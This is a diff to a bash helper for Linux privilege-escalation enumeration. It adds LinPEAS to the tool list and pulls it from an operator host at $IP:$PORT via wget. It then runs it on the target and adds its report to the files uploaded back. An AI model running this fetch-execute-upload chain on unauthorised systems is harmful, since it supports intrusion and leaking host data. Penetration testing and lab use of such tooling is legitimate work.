@@ -108,6 +108,7 @@ function update () {
 		# Get all scripts, overwrite if they already exist
 		echo -e "${GREEN}[i] Updating all tools...${NC}";
 		# Enumeration scripts
+		wget -nv "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh;
 		wget -nv "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;
 		wget -nv "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh;
 		wget -nv "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py;
@@ -177,6 +178,8 @@ function download () {
 				exit 1;
 		else
 				chmod +x "$DIR"/lse.sh;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linpeas.sh" -O "$DIR"/linpeas.sh;
+				chmod +x "$DIR"/linpeas.sh;
 				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
 				chmod +x "$DIR"/linenum.sh;
 				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
@@ -202,6 +205,9 @@ function runtools () {
 		read -p "[?] a/n/e/s " answer
 		echo -e "${NC}";
 		if [[ ${answer} == "all" || ${answer} == "a" ]]; then
+				start "LinPEAS";
+				"$DIR"/linpeas.sh -a | tee "$DIR"/linpeas-report.txt;
+				complete "LinPEAS";
 				start "Linux Smart Enumeration";
 				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
 				complete "Linux Smart Enumeration";
@@ -250,6 +256,9 @@ function runtools () {
 				echo -e "${GREEN}********************************************************************************${NC}";
 				exit 0;
 		elif [[ ${answer} == "enumeration" || ${answer} == "e" ]]; then
+				start "LinPEAS";
+				"$DIR"/linpeas.sh -a | tee "$DIR"/linpeas-report.txt;
+				complete "LinPEAS";
 				start "Linux Smart Enumeration";
 				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
 				complete "Linux Smart Enumeration";
@@ -298,7 +307,7 @@ function runtools () {
 # Upload reports
 function upload () {
 
-	REPORTS=( "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" )
+	REPORTS=( "linpeas-report.txt" "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" )
 
 	CURL=$(command -v curl);
 	if [[ "$CURL" == ""  ]]; then
